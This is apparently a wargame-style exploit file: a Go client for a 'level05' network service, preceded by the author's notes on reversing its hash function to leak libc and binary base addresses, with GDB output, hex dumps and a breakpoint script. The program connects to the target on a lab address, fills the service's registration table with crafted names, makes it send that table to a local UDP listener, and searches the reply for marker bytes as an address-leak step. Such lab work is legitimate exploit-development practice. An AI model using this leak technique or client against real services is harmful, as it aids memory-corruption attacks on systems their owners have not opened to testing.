/* notes:

===

While previous attempts have largely ignored the sausage machine, and
its inner workings. A new day is here and its impractical to continue
to ignore it.

Testing and looking at the stuff with hash.c does give some insights.

Least significant byte appears to be non-changing. And it is
irrelevant for discovery of libc/level05 base.

Discovery!

The key point to remember here is that the hash function is, allthough
not understandable, limited in output.

If we fill the leading 21 bytes in the buffer with garbage, there is
(2^8)*3 combinations left which can be used to generate an index. 21
because we neither care about the 20 leading, nor the following lsb of
the address we want to leak.

During this discovery or insight, GDB output looked like this:

Breakpoint 2, hash (str=0xb82a6eb0 'a' <repeats 20 times>, "ﾭ\336\002", length=25, mask=127) at level05/level05.c:23
23	in level05/level05.c
final:  0b11101001011000111101001100011011 0xe963d31bL
0000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
0000010: 6161 6161 efbe adde 0200 0000 49a3 80b7  aaaa........I...
string: ptr @ str+20: 0xb82a6ec4:	0xdeadbeef
ptr @ str+24: 0xb82a6ec8:	0x2
ptr @ str+28: 0xb82a6ecc:	0xb780a349 <taskswitch+41>

Breakpoint 2, hash (str=0xb82a6ee0 'a' <repeats 20 times>, "ﾭ\336\002", length=25, mask=127) at level05/level05.c:23
23	in level05/level05.c
final:  0b11101001011000111101001100011011 0xe963d31bL
0000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
0000010: 6161 6161 efbe adde 0200 0000 49a3 80b7  aaaa........I...
string: ptr @ str+20: 0xb82a6ef4:	0xdeadbeef
ptr @ str+24: 0xb82a6ef8:	0x2
ptr @ str+28: 0xb82a6efc:	0xb780a349 <taskswitch+41>

0xdeadbeef, being the address that we want to guess. Note that length
appears to be consistent between invocations, meaning that the index
that is being reproduced by hash function is going to be consistent.
This is good for us because it removes noise due to random data
occuring on the stack and being incorporated into the deduction of
index by the hash function.

u@p:~$ echo -e "checkname aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde" | ./hash 
36

invoking the hash function results in index 36, Will it be used by the service?

u@p:~$ echo -e "addreg aaaaaaaaaaaaaaaaaaaa\xef\xbe\xad\xde" | go run level05.go

(gdb) p/x registrations
$1 = {{flags = 0x0, ipv4 = 0x0} <repeats 94 times>, {flags = 0x20, ipv4 = 0x20b0b0a}, {flags = 0x0, ipv4 = 0x0} <repeats 33 times>}

it appears that no, it was not used. This might be due to different behaviour of my ./hash, and the hash used in the program. In fact, the index 94 was generated.
There is obviously a discrepency between the behaviours of addreg and checkname.

====

gdb lazy

---
set pagination off
set disassembly-flavor intel

break *hash+93
commands
 silent
 i r eax
 c
end

break *hash+86
commands
 #printf "final:  "
 #python print bin(int(gdb.parse_and_eval("((uint)$eax)"))), hex(int(str(gdb.parse_and_eval("((uint)$eax)"))))
 xxd str 32
 #printf "ptr @ str+20: "
 x/a str+20
 #printf "ptr @ str+24: "
 #x/a str+24
 #printf "ptr @ str+28: "
 #x/a str+28
 c
end

define xxd
 dump binary memory dump.bin $arg0 $arg0+$arg1
 shell xxd dump.bin
 shell rm dump.bin
end

printf "base addresses: "
info proc mappings

c

---
*/

package main

import (
	"bytes"
	"flag"
	"strings"
	"time"
	"io"
	"os"
	"net"
	"fmt"
	"log"
	"bufio"
	"io/ioutil"
	"strconv"
)

var interactive = false
var registrations = make([]string,128)

func fill(conn net.Conn) {
	data, err := ioutil.ReadFile("indexes")
	check("fill",err)
	for _,line := range strings.Split(string(data),"\n") {
		sindex := strings.Split(line," ")[0]
		if sindex == "" {
			continue
		}
		index, err := strconv.Atoi(sindex)
		check("fill",err)
		name  := strings.Split(line," ")[1]
		fmt.Printf("adding %s to index %d\n",name,index)
		addreg(conn,name,false)
		registrations[index] = name
		time.Sleep(time.Microsecond * 15000)
	}
}

func read(conn net.Conn) string {
	buf := make([]byte, 4096)
	tmp := make([]byte, 8)
	for {
		err := conn.SetReadDeadline(time.Now().Add(time.Millisecond * 200))
		check("main,SetReadDeadline",err)
		n, err := conn.Read(tmp)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			if err != io.EOF {
				fmt.Printf("main,Read: %s\n",err)
			}
			break
		}
		buf = append(buf,tmp[:n]...) 
	}
	
	if len(string(buf)) > 0 {
		return fmt.Sprintf("%s",buf)
	} else {
		return ""
	}	
}

func senddb(conn net.Conn) {
	_, err := fmt.Fprintf(conn,"senddb 10.11.11.2 8000\n")
	check("senddb", err)
}

func addreg(conn net.Conn, name string, mark bool) {
	if mark {
		_, err := fmt.Fprintf(conn,"addreg %s 32 255.255.255.255\n",name)
		check("register",err)
	} else {
		_, err := fmt.Fprintf(conn,"addreg %s 32 1.2.3.4\n",name)
		check("register",err)
	}
}

func delreg(conn net.Conn, name string) {
	_, err := fmt.Fprintf(conn,"addreg %s 0 0.0.0.0\n",name)
	check("unregister",err)
}

func isup(conn net.Conn) {
	_, err := fmt.Fprintf(conn,"isup asd 8000\n")
	check("isup",err)
}

func checkname(conn net.Conn, name string) bool {
	_, err := fmt.Fprintf(conn, "checkname %s\n",name)
	check("checkname",err)
	resp := read(conn)
	if strings.Contains(resp, "is not indexed already") {
		return false
	}
	return true
}

func handle(data []byte,rlen int) {
	fmt.Printf("[handler] Server sent %d bytes: %x\n",rlen,data[:rlen])
	index := bytes.Index(data,[]byte{255,255,255,255})
	more  := 0 
	if index != -1 {
		entry := index / 6
		fmt.Printf("Mark @ index %d\n",entry)
		more = bytes.Index(data[index+4:],[]byte{255,255,255,255})
		if more != -1 {
			fmt.Printf("MOAR!\n")
		}
	}

	/*for {
		if more == -1 {
			break
		}
	}*/
}

func check(where string, err error) {
	if err != nil {
		log.Fatalf("[%s] - %s\n",where,err)
	}
}

func main() {
	flag.BoolVar(&interactive, "i", false, "interactive-mode")
	flag.Parse()

	addr := net.UDPAddr{
		Port: 8000,
		IP:   net.ParseIP("10.11.11.2"),
	}

	ln, err := net.ListenUDP("udp", &addr) 
	check("main,Listen",err)
	defer ln.Close()

	go func() {
		for {
			buf := make([]byte, 1024)
			//conn, err := ln.Accept()
			rlen,_,err := ln.ReadFromUDP(buf)
			check("main,ReadFromUDP",err)
			go handle(buf,rlen)
		}
	}()
	
	fmt.Println("started UDP local listener")

	conn, err := net.Dial("tcp","10.11.11.6:20005")
	check("main,net.Dial",err)
	defer conn.Close()

	fmt.Println("connected to remote server")

	if interactive {
		for {
			fmt.Printf("cmd: ")
			cmd,err := bufio.NewReader(os.Stdin).ReadString('\n')
			check("main,read cmd",err)

			cmd = strings.TrimSpace(cmd)
			
			if cmd == "EXIT" {
				log.Fatal("bye!")
			}

			if len(cmd) == 0 {
				fmt.Printf("\n")
				continue
			}

			switch strings.Split(cmd," ")[0] {
			case "addmark":
				name := strings.Split(cmd," ")[1]
				addreg(conn,name,true)
			case "senddb":
				senddb(conn)
				break
			case "addreg":
				name := strings.Split(cmd," ")[1]
				addreg(conn, name, false)
				break
			case "delreg":
				name := strings.Split(cmd," ")[1]
				delreg(conn,name)
				break
			case "isup":
				isup(conn)
			case "checkname":
				name := strings.Split(cmd," ")[1]
				r := checkname(conn,name)
				fmt.Printf("%s -> %v\n", name, r)
				continue
			default:
				fmt.Printf("sending cmd: %s\n",cmd)
				_, err = fmt.Fprintf(conn,"%s\n",cmd)
				check("main,Fprintf",err)
			}
			resp := read(conn)
			if resp != "" {
				fmt.Printf("resp: %s\n", read(conn))
			}
		}
	} else {
		// fill up the buffer with known stuff
		fill(conn)
	}
}
